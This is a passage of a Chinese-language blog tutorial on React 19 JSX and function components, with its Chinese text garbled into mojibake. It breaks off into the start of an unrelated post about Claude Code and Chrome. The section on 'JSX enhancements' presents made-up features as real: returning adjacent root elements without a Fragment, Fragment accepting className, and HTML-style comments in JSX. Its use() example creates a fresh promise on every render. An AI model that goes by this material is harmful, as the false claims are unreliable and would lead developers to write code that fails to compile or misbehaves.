  <span class="hljs-keyword">const</span> message = <span class="hljs-string">"Hello React 19! æˆ‘æ˜¯å‡½æ•°ç»„ä»¶"</span>;
  
  <span class="hljs-comment">// è¿”å› JSXï¼šæè¿° UI ç»“æ„</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{message}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯æˆ‘å†™çš„ç¬¬ä¸€ä¸ª React 19 å‡½æ•°ç»„ä»¶ï½<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// ä½¿ç”¨ç»„ä»¶ï¼šåƒç”¨ HTML æ ‡ç­¾ä¸€æ ·ä½¿ç”¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"App"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">HelloReact19</span> /&gt;</span> {/* ç»„ä»¶ä½¿ç”¨æ—¶å¿…é¡»é—­åˆæ ‡ç­¾ */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<h3 data-id="heading-5">2. ç»„ä»¶ä¼ å‚ï¼šé€šè¿‡ props ä¼ é€’æ•°æ®</h3>
<p>å¦‚æœæˆ‘ä»¬æƒ³è®©ç»„ä»¶æ›´çµæ´»ï¼ˆæ¯”å¦‚ä¸åŒåœºæ™¯æ˜¾ç¤ºä¸åŒå†…å®¹ï¼‰ï¼Œå°±éœ€è¦é€šè¿‡ <code>props</code> ç»™ç»„ä»¶ä¼ é€’æ•°æ®ã€‚props æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«äº†çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„æ‰€æœ‰å‚æ•°ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ¥æ”¶ props å‚æ•°ï¼Œä½¿ç”¨è§£æ„èµ‹å€¼ç®€åŒ–å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Greeting</span>(<span class="hljs-params">{ name, age }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä½ å¥½ï¼Œæˆ‘æ˜¯ {name}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä»Šå¹´ {age} å²ï¼Œæ­£åœ¨å­¦ä¹  React 19<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// çˆ¶ç»„ä»¶ä¼ é€’ props</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"App"</span>&gt;</span>
      {/* ä¼ é€’ name å’Œ age ä¸¤ä¸ªå‚æ•° */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Greeting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å°æ˜"</span> <span class="hljs-attr">age</span>=<span class="hljs-string">{22}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Greeting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"å°çº¢"</span> <span class="hljs-attr">age</span>=<span class="hljs-string">{21}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-6">3. ç»„ä»¶åµŒå¥—ï¼šç»„åˆå‡ºå¤æ‚ UI</h3>
<p>å‡½æ•°ç»„ä»¶æ”¯æŒåµŒå¥—ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå¤æ‚çš„ UI æ‹†åˆ†æˆå¤šä¸ªå°ç»„ä»¶ï¼Œå†ç»„åˆèµ·æ¥ï¼Œè¿™ä¹Ÿæ˜¯ React â€œç»„ä»¶åŒ–â€æ€æƒ³çš„æ ¸å¿ƒã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬è¦å®ç°ä¸€ä¸ªâ€œç”¨æˆ·å¡ç‰‡åˆ—è¡¨â€ï¼Œå¯ä»¥æ‹†æˆ <code>UserCard</code>ï¼ˆå•ä¸ªç”¨æˆ·å¡ç‰‡ï¼‰å’Œ <code>UserList</code>ï¼ˆå¡ç‰‡åˆ—è¡¨å®¹å™¨ï¼‰ä¸¤ä¸ªç»„ä»¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å•ä¸ªç”¨æˆ·å¡ç‰‡ç»„ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserCard</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">const</span> { name, avatar, desc } = user;
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">border:</span> "<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">eee</span>", <span class="hljs-attr">padding:</span> "<span class="hljs-attr">16px</span>", <span class="hljs-attr">borderRadius:</span> "<span class="hljs-attr">8px</span>", <span class="hljs-attr">margin:</span> "<span class="hljs-attr">8px</span>" }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{name}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">width:</span> "<span class="hljs-attr">80px</span>", <span class="hljs-attr">height:</span> "<span class="hljs-attr">80px</span>", <span class="hljs-attr">borderRadius:</span> "<span class="hljs-attr">50</span>%" }} /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{name}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{desc}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// ç”¨æˆ·åˆ—è¡¨ç»„ä»¶ï¼ˆåµŒå¥— UserCardï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserList</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·æ•°æ®</span>
  <span class="hljs-keyword">const</span> users = [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">"å°æ˜"</span>,
      <span class="hljs-attr">avatar</span>: <span class="hljs-string">"https://via.placeholder.com/80"</span>,
      <span class="hljs-attr">desc</span>: <span class="hljs-string">"React 19 å­¦ä¹ è€…"</span>
    },
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">"å°çº¢"</span>,
      <span class="hljs-attr">avatar</span>: <span class="hljs-string">"https://via.placeholder.com/80"</span>,
      <span class="hljs-attr">desc</span>: <span class="hljs-string">"å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆ"</span>
    }
  ];
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ç”¨æˆ·åˆ—è¡¨<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      {/* å¾ªç¯æ¸²æŸ“ UserCard ç»„ä»¶ */}
      {users.map((user, index) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">UserCard</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// æ ¹ç»„ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"App"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">UserList</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€React 19 æ ¸å¿ƒï¼šJSX å¢å¼ºç‰¹æ€§è¯¦è§£</h2>
<p>React 19 å¯¹ JSX è¯­æ³•åšäº†ä¸å°‘å®ç”¨å¢å¼ºï¼Œè§£å†³äº†ä¹‹å‰ç‰ˆæœ¬çš„ä¸€äº›ç—›ç‚¹ã€‚ä¸‹é¢å’±ä»¬é‡ç‚¹è®²å‡ ä¸ªæœ€å¸¸ç”¨çš„å¢å¼ºç‰¹æ€§ï¼Œç»“åˆæ¡ˆä¾‹è¯´æ˜ç”¨æ³•å’Œä¼˜åŠ¿ã€‚</p>
<h3 data-id="heading-8">1. ç‰¹æ€§ 1ï¼šå¤šæ ¹èŠ‚ç‚¹é»˜è®¤ä¸åŒ…è£¹ï¼ˆæ— éœ€æ‰‹åŠ¨å†™ Fragmentï¼‰</h3>
<p>åœ¨ React 18 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼ŒJSX è¦æ±‚å¿…é¡»æœ‰ä¸€ä¸ªâ€œå”¯ä¸€æ ¹èŠ‚ç‚¹â€ï¼Œå¦‚æœæƒ³è¿”å›å¤šä¸ªåŒçº§èŠ‚ç‚¹ï¼Œéœ€è¦ç”¨ <code>&lt;&gt;&lt;/&gt;</code>ï¼ˆFragment ç¢ç‰‡ï¼‰åŒ…è£¹ã€‚</p>
<p>è€Œ React 19 æ”¯æŒâ€œå¤šæ ¹èŠ‚ç‚¹é»˜è®¤ä¸åŒ…è£¹â€ï¼Œç›´æ¥è¿”å›å¤šä¸ªåŒçº§èŠ‚ç‚¹å³å¯ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬å¤„ç†ä¸º Fragmentï¼Œä»£ç æ›´ç®€æ´ã€‚</p>
<h4 data-id="heading-9">âŒ React 18 åŠä¹‹å‰çš„å†™æ³•ï¼ˆå¿…é¡»åŒ…è£¹ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 18 åŠä¹‹å‰ï¼šå¤šæ ¹èŠ‚ç‚¹å¿…é¡»ç”¨ Fragment åŒ…è£¹</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Navbar</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span> {/* å¿…é¡»å†™ Fragment */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"logo"</span>&gt;</span>React 19 -logo<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"menu"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>é¦–é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ–‡æ¡£<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-10">âœ… React 19 å¢å¼ºå†™æ³•ï¼ˆæ— éœ€åŒ…è£¹ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 19ï¼šç›´æ¥è¿”å›å¤šæ ¹èŠ‚ç‚¹ï¼Œæ— éœ€æ‰‹åŠ¨å†™ Fragment</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Navbar</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"logo"</span>&gt;</span>React 19 -logo<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"menu"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>é¦–é¡µ<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>æ–‡æ¡£<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span>
  );
}
</code></pre>
<p>æ³¨æ„ï¼šå¦‚æœéœ€è¦ç»™å¤šæ ¹èŠ‚ç‚¹æ·»åŠ  keyï¼ˆæ¯”å¦‚å¾ªç¯æ¸²æŸ“æ—¶ï¼‰ï¼Œè¿˜æ˜¯éœ€è¦æ˜¾å¼å†™ ï¼Œå› ä¸ºç®€å†™çš„ &lt;&gt;&lt;/&gt; ä¸æ”¯æŒæ·»åŠ å±æ€§ã€‚</p>
<h3 data-id="heading-11">2. ç‰¹æ€§ 2ï¼šæ”¹è¿›çš„ Fragment è¯­æ³•ä¸å±æ€§æ”¯æŒ</h3>
<p>React 19 å¯¹ Fragment è¯­æ³•åšäº†ä¼˜åŒ–ï¼Œé™¤äº†æ”¯æŒé»˜è®¤ä¸åŒ…è£¹ï¼Œè¿˜å…è®¸ç»™æ˜¾å¼ Fragment æ·»åŠ æ›´å¤šå±æ€§ï¼ˆä¹‹å‰ç‰ˆæœ¬ä»…æ”¯æŒ keyï¼‰ã€‚æ¯”å¦‚æˆ‘ä»¬å¯ä»¥ç»™ Fragment æ·»åŠ  classNameï¼Œç”¨äºæ ·å¼æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// React 19ï¼šFragment æ”¯æŒæ·»åŠ  className ç­‰å±æ€§</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Fragment</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"user-info-container"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å§“åï¼š{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>é‚®ç®±ï¼š{user.email}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">Fragment</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¿™ç§å†™æ³•åœ¨éœ€è¦ç»™ä¸€ç»„åŒçº§èŠ‚ç‚¹ç»Ÿä¸€æ·»åŠ æ ·å¼æˆ–å…¶ä»–å±æ€§æ—¶éå¸¸å®ç”¨ï¼Œé¿å…äº†é¢å¤–åµŒå¥— div æ ‡ç­¾ã€‚</p>
<h3 data-id="heading-12">3. ç‰¹æ€§ 3ï¼šJSX ä¸­ç›´æ¥ä½¿ç”¨ Promiseï¼ˆé…åˆ use() Hookï¼‰</h3>
<p>React 19 æ–°å¢çš„ <code>use()</code> Hook å…è®¸æˆ‘ä»¬åœ¨ JSX ä¸­ç›´æ¥å¤„ç† Promise æ•°æ®ï¼Œæ— éœ€é¢å¤–å†™ useEffect æ¥ç›‘å¬ Promise çŠ¶æ€ã€‚è¿™æ˜¯ JSX ä¸æ•°æ®å¤„ç†ç»“åˆçš„é‡è¦å¢å¼ºï¼Œç®€åŒ–äº†å¼‚æ­¥æ•°æ®æ¸²æŸ“é€»è¾‘ã€‚</p>
<p>ç¤ºä¾‹ï¼šä»æ¥å£è·å–ç”¨æˆ·æ•°æ®å¹¶æ¸²æŸ“</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { use } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// æ¨¡æ‹Ÿæ¥å£è¯·æ±‚ï¼šè¿”å› Promise</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å°æ˜"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span> });
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-comment">// ç»„ä»¶ä¸­ç›´æ¥ç”¨ use() å¤„ç† Promise</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// use() æ¥æ”¶ Promiseï¼Œè¿”å› resolved åçš„æ•°æ®</span>
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">use</span>(<span class="hljs-title function_">fetchUser</span>());
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ç”¨æˆ·ä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å§“åï¼š{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å¹´é¾„ï¼š{user.age}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼šuse() åªèƒ½åœ¨å‡½æ•°ç»„ä»¶çš„é¡¶å±‚æˆ–è‡ªå®šä¹‰ Hook ä¸­ä½¿ç”¨ï¼Œä¸èƒ½åœ¨æ¡ä»¶è¯­å¥ã€å¾ªç¯æˆ–åµŒå¥—å‡½æ•°ä¸­ä½¿ç”¨ï¼ˆéµå¾ª Hooks çš„è°ƒç”¨è§„åˆ™ï¼‰ã€‚</p>
<h3 data-id="heading-13">4. ç‰¹æ€§ 4ï¼šJSX æ³¨é‡Šè¯­æ³•ä¼˜åŒ–</h3>
<p>React 19 å¯¹ JSX ä¸­çš„æ³¨é‡Šè¯­æ³•åšäº†å…¼å®¹ä¼˜åŒ–ï¼Œæ”¯æŒæ›´ç›´è§‚çš„æ³¨é‡Šå†™æ³•ã€‚ä¹‹å‰çš„æ³¨é‡Šéœ€è¦ç”¨ <code>{/* æ³¨é‡Šå†…å®¹ */}</code> åŒ…è£¹ï¼Œç°åœ¨åœ¨æŸäº›åœºæ™¯ä¸‹ä¹Ÿæ”¯æŒ HTML é£æ ¼çš„<code>&lt;!-- æ³¨é‡Šå†…å®¹ --&gt;</code>ï¼ˆä¸è¿‡æ›´æ¨èè¿˜æ˜¯ç”¨ {/* */}ï¼Œå…¼å®¹æ€§æ›´å¥½ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CommentDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      {/* React æ¨èçš„æ³¨é‡Šå†™æ³•ï¼ˆå…¨ç‰ˆæœ¬å…¼å®¹ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>JSX æ³¨é‡Šç¤ºä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- HTML é£æ ¼æ³¨é‡Šï¼ˆReact 19 æ”¯æŒï¼Œä¸æ¨èåœ¨å¤æ‚åœºæ™¯ä½¿ç”¨ï¼‰ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ³¨é‡Šä¸ä¼šè¢«æ¸²æŸ“åˆ°é¡µé¢ä¸Š<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h2 data-id="heading-14">å››ã€JSX ä¸å‡½æ•°ç»„ä»¶çš„æ ¸å¿ƒæ³¨æ„äº‹é¡¹</h2>
<p>æŒæ¡äº†åŸºæœ¬ç”¨æ³•åï¼Œå’±ä»¬å†æ¢³ç†å‡ ä¸ªå®¹æ˜“è¸©å‘çš„ç‚¹ï¼Œå¸®å¤§å®¶é¿å¼€è¯¯åŒºï¼š</p>
<ol>
<li><strong>JSX ä¸­çš„å±æ€§åé‡‡ç”¨é©¼å³°å‘½åæ³•</strong>ï¼šHTML ä¸­çš„ <code>class</code> è¦å†™æˆ <code>className</code>ï¼Œ<code>for</code> è¦å†™æˆ <code>htmlFor</code>ï¼Œé¿å…ä¸ JavaScript å…³é”®å­—å†²çªã€‚</li>
<li><strong>JSX ä¸­åµŒå…¥ JavaScript è¡¨è¾¾å¼ç”¨ {}</strong> ï¼šæ¯”å¦‚å˜é‡ã€å‡½æ•°è°ƒç”¨ã€ä¸‰å…ƒè¡¨è¾¾å¼ç­‰ï¼Œä½†ä¸èƒ½åµŒå…¥è¯­å¥ï¼ˆifã€for ç­‰ï¼‰ã€‚ç¤ºä¾‹ï¼š<code>{isShow ? &lt;div&gt;æ˜¾ç¤º&lt;/div&gt; : null}</code>ã€‚</li>
<li><strong>å‡½æ•°ç»„ä»¶çš„è¿”å›å€¼å¿…é¡»æ˜¯å•ä¸ªæ ¹èŠ‚ç‚¹æˆ–å¤šæ ¹èŠ‚ç‚¹ï¼ˆReact 19ï¼‰</strong> ï¼šä¸èƒ½è¿”å› undefinedï¼ˆæ¯”å¦‚å¿˜è®°å†™ return è¯­å¥ï¼‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</li>
<li><strong>ç»„ä»¶åå¿…é¡»ä»¥å¤§å†™å­—æ¯å¼€å¤´</strong>ï¼šReact é€šè¿‡é¦–å­—æ¯å¤§å°å†™åŒºåˆ†ç»„ä»¶å’Œæ™®é€š HTML æ ‡ç­¾ã€‚å¦‚æœç»„ä»¶åå°å†™ï¼ŒReact ä¼šæŠŠå®ƒå½“ä½œ HTML æ ‡ç­¾å¤„ç†ï¼Œå¯¼è‡´æ¸²æŸ“å¤±è´¥ã€‚</li>
</ol>
<h2 data-id="heading-15">äº”ã€æ€»ç»“ä¸ä¸‹ä¸€æ­¥å­¦ä¹ æ–¹å‘</h2>
<p>ä»Šå¤©å’±ä»¬é‡ç‚¹è®²äº† React 19 ä¸­ JSX çš„å¢å¼ºç‰¹æ€§å’Œå‡½æ•°ç»„ä»¶çš„åŸºç¡€ç”¨æ³•ï¼š</p>
<ul>
<li>å‡½æ•°ç»„ä»¶æ˜¯ React 19 çš„æ ¸å¿ƒè½½ä½“ï¼Œæ ¸å¿ƒæ˜¯â€œæ¥æ”¶ propsã€è¿”å› JSXâ€ï¼Œæ”¯æŒåµŒå¥—å’Œç»„åˆï¼›</li>
<li>React 19 å¯¹ JSX çš„å¢å¼ºï¼ˆå¤šæ ¹èŠ‚ç‚¹é»˜è®¤ä¸åŒ…è£¹ã€Fragment æ”¯æŒæ›´å¤šå±æ€§ã€é…åˆ use() å¤„ç† Promise ç­‰ï¼‰å¤§å¹…æå‡äº†å¼€å‘æ•ˆç‡ï¼›</li>
<li>æŒæ¡é©¼å³°å‘½åã€è¡¨è¾¾å¼åµŒå…¥ç­‰æ³¨æ„äº‹é¡¹ï¼Œèƒ½å¸®æˆ‘ä»¬é¿å¼€å¤§éƒ¨åˆ†åŸºç¡€å‘ã€‚</li>
</ul>
<p>ä¸‹ä¸€æ­¥ï¼Œå¤§å®¶å¯ä»¥ç»§ç»­å­¦ä¹  React 19 çš„å†…ç½® Hooksï¼ˆæ¯”å¦‚ useStateã€useEffectï¼‰ï¼Œè¿™æ˜¯å®ç°ç»„ä»¶çŠ¶æ€ç®¡ç†å’Œå‰¯ä½œç”¨å¤„ç†çš„æ ¸å¿ƒã€‚åç»­æˆ‘ä¹Ÿä¼šç»§ç»­æ›´æ–°ç›¸å…³æ–‡ç« ï¼Œæ•¬è¯·æœŸå¾…ï½</p>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµã€æ”¶è—ã€è½¬å‘ï½ æœ‰ä»»ä½•é—®é¢˜ä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºç•™è¨€äº¤æµï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude Code + Chrome é›†æˆï¼šå¿«é€Ÿè®¾ç½®æŒ‡å—]]></title>    <link>https://juejin.cn/post/7589897523269468170</link>    <guid>https://juejin.cn/post/7589897523269468170</guid>    <pubDate>2026-01-01T14:26:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589897523269468170" data-draft-id="7589897523269419018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude Code + Chrome é›†æˆï¼šå¿«é€Ÿè®¾ç½®æŒ‡å—"/> <meta itemprop="keywords" content="Claude"/> <meta itemprop="datePublished" content="2026-01-01T14:26:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜¯é­”ä¸¸å•Š"/> <meta itemprop="url" content="https://juejin.cn/user/3217622495411292"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude Code + Chrome é›†æˆï¼šå¿«é€Ÿè®¾ç½®æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3217622495411292/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜¯é­”ä¸¸å•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T14:26:28.000Z" title="Thu Jan 01 2026 14:26:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
